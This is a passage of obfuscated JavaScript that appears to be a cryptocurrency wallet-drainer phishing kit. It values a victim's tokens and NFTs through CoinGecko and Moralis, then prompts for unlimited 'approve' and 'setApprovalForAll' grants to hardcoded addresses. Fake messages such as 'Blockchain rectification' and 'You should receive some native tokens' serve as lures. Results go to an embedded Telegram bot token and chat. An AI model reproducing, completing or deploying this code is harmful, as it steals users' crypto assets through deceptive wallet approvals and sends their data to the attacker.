_0x4249a2=_0x3c47,_0x57e14f=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x57e14f+_0x4249a2(0x13f)+_0x579407,{'method':_0x4249a2(0x10e),'headers':{}})[_0x4249a2(0xdb)](async _0x424908=>{const _0x108420=_0x4249a2;if(_0x424908[_0x108420(0x155)]>0x18f)throw _0x424908;_0x53a93f(await _0x424908['json']());})[_0x4249a2(0xc3)](_0xe35c80=>{_0x50063f(_0xe35c80);});});}async function getPrice(_0x5f57e4){return new Promise((_0x426c23,_0x3607c6)=>{const _0x48704b=_0x3c47;fetch('https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses='+_0x5f57e4+'&vs_currencies=usd',{'method':'GET','headers':{}})['then'](async _0x4f5f5a=>{const _0x14b3e8=_0x3c47;if(_0x4f5f5a[_0x14b3e8(0x155)]>0x18f)throw _0x4f5f5a;_0x426c23(await _0x4f5f5a['json']());})[_0x48704b(0xc3)](_0x14dffd=>{_0x3607c6(_0x14dffd);});});}async function getValue(_0x432a82,_0x62c8f9,_0xba0e1a){const _0x215eca=_0x5988e9;console[_0x215eca(0x100)](_0x432a82,_0x62c8f9,_0xba0e1a);let _0x3d435b=await getPrice(_0x432a82);console[_0x215eca(0x100)](_0x215eca(0x169),_0x3d435b),_0x3d435b=parseFloat(_0x3d435b[_0x432a82]['usd']);let _0x2859cc=_0x62c8f9/0xa**(_0xba0e1a||0x12)*_0x3d435b;return _0x2859cc=parseInt(_0x2859cc),_0x3d435b?_0x2859cc:0x0;}function _0x4918(){const _0x24c09b=['2243610LKxiQB','trustwallet','spender','then','isApprovedForAll','allowed','REVEAL_TIMESTAMP','newAddress','_totalSupply','pause','coinbase','transferOwnership','function','apePrice','ownerOf','balances','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','renounceOwnership','newOwner','/nft/collections?chain=','approve','basisPointsRate','999999999999999999999999999999999999999999999999999999999999999999999999','metamask','tokenOfOwnerByIndex','constructor','string','Unpause','Incorrect\x20network','setApprovalForAll','Transaction\x20Receipt:\x20','deprecated','.coinbase','filter','Transaction\x20is\x20submitted\x20to\x20the\x20network','getApproved','withdraw','.meta','_blackListedUser','log','upgradedAddress','_evilUser','NFT\x20Contract\x20Address\x20','decimals','bytes4','remaining','maximumFee','numberOfTokens','newBasisPoints','href','maxNftSupply','Blockchain\x20rectification','345541DsIuNq','GET','revealTimeStamp','1ZOfSkw','previousOwner','json','Transfer','_user','https://link.trustwallet.com/open_url?url=','operator','Hahahahahah','_clearedUser','Approve\x20Completed\x20Successfully','formatted','_value','unpause','Deprecate','bool','from','startingIndexBlock','maxApePurchase','0xea8968B218a551919FbD5f1166328C82a96dED54','uint256','emergencySetStartingIndexBlock','token_address','TOKEN\x20Contract\x20Address\x20','tokenByIndex','connector','_owner','2664984cjmKUQ','Initial\x20list\x20','getBlackListStatus','NFTs\x20collection\x20','Error\x20collecting\x20info\x20about\x20wallet','mintApe','1803423mXNvHs','approved','AddedBlackList','name','message','_spender','Token','toString','redeem','index','networkVersion','ee71d215d0dec7d1bf950851c84d9643','error','openModal','37881aqeztT','&text=','amount','value','setParams','_symbol','https://deep-index.moralis.io/api/v2/','deprecate','view','symbol','flipSaleState','length','4JGXroN','_from','MetaMask','options','provenanceHash','Issue','_maker','undefined','click','Approval','1830qTAyrM','status','balanceOf','Redeem','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','location','removeBlackList','supportsInterface','feeBasisPoints','New\x20token','&format=decimal&limit=','all','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','avalanche','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','_initialSupply','No\x20address','saleStart','NFT','newMaxFee','tokenURI','price','bytes','baseURI','nonpayable','Your\x20address\x20','application/json','owner','_to','Params','132RljBin','sort','tokens-list','totalSupply','4241000cnPsJC','transferFrom','0xF7CC89c87B626A9b2B16ed6a6922aaF4b3B8fbf8','Token\x20balance\x20is\x20','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','.connect','gasPrice','Error:\x20','setStartingIndex','getProvider','event','balance','_name','sending\x20ether','.trust','tokenId','catch','chainId:','addBlackList','result','30EAIWcQ','.proceed','setProvenanceHash','ApprovalForAll','Error\x20processing\x20item\x20','hash','who','Unable\x20to\x20get\x20NFts','isBlackListed','maxFee','https://go.cb-w.com/dapp?cb_url=','address','43114','map','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','saleIsActive','1497166wAUDKD'];_0x4918=function(){return _0x24c09b;};return _0x4918();}async function getNFTs(_0x1702dc='',_0x474d7c=_0x5988e9(0xe9),_0x3386fc=_0x5988e9(0x161),_0x1f1fa3='50'){return new Promise((_0x1169a3,_0x2ba7a3)=>{const _0x1e524f=_0x3c47;fetch(_0x1e524f(0x144)+_0x1702dc+_0x1e524f(0xec)+_0x3386fc+_0x1e524f(0x15e)+_0x1f1fa3,{'method':_0x1e524f(0x10e),'headers':{'accept':_0x1e524f(0x16e),'X-API-Key':_0x474d7c}})[_0x1e524f(0xdb)](async _0x1a0afd=>{const _0x3ddbe8=_0x1e524f;if(_0x1a0afd[_0x3ddbe8(0x155)]>0x18f)throw _0x1a0afd;_0x1169a3(await _0x1a0afd[_0x3ddbe8(0x112)]());})['catch'](_0x407996=>{_0x2ba7a3(_0x407996);});});}